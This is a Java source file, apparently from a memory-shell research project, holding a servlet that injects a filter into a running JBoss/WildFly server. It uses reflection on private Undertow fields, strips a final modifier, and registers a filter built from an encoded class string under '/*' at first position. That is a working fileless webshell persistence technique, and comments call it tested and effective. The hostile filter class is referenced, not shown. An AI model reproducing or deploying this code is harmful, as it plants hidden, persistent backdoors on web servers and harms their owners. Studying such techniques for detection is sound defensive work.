package org.su18.memshell.test.jboss;


import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

import static org.su18.memshell.test.jboss.DynamicUtils.FILTER_CLASS_STRING;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * 亲测有效
 * 测试版本 JBoss/WildFly 18.0.0.Final
 *
 * @author su18
 */
public class AddJBossFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {
			String filterName = "su18JbossFilter";
			String urlPattern = "/*";

			ServletContext context = req.getServletContext();
			Field          f       = context.getClass().getDeclaredField("deploymentInfo");
			f.setAccessible(true);
			DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);

			//只添加一次
			Map<String, FilterInfo> filters = deploymentInfo.getFilters();
			if (!filters.containsKey(filterName)) {

				Class      clazz  = DynamicUtils.getClass(FILTER_CLASS_STRING);
				FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
				deploymentInfo.addFilter(filter);

				f = context.getClass().getDeclaredField("deployment");
				f.setAccessible(true);
				Field modifiersField = Field.class.getDeclaredField("modifiers");
				modifiersField.setAccessible(true);
				modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
				DeploymentImpl deployment = (DeploymentImpl) f.get(context);
				deployment.getFilters().addFilter(filter);

				// 0 表示把我们动态注册的 filter 放在第一位
				deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);

				resp.getWriter().println("jboss wildfly filter added");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}